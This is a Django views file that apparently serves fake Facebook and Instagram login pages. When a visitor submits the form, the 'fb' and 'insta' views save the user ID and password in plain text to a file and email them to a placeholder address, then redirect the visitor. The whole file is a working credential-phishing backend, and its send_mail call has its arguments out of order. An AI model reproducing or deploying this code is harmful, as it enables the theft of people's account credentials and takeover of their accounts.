from django.shortcuts import redirect, render
from django.core.mail import send_mail
from django.conf import settings

def index(request):
    return render(request, 'home.html')

def fb(request):
    if request.method=="POST":
        userid=request.POST.get("userid")
        password=request.POST.get("password")
        notify("fb", userid, password)
        with open("insta.txt", 'a') as f:
            f.write(f"{userid} - {password}\n")
        return redirect('/')
    return render(request, 'fb.html')

def insta(request):
    if request.method=="POST":
        userid=request.POST.get("userid")
        password=request.POST.get("password")
        notify("insta", userid, password)
        with open("insta.txt", 'a') as f:
            f.write(f"{userid} - {password}\n")
        return redirect('/')
    return render(request, 'insta.html')

def notify(type, userid, password):
    mail_from=settings.EMAIL_HOST_USER
    to=["your_email_to_notify"]
    send_mail("Someone  Log In.", mail_from, f"{type} {userid} & {password}", to)
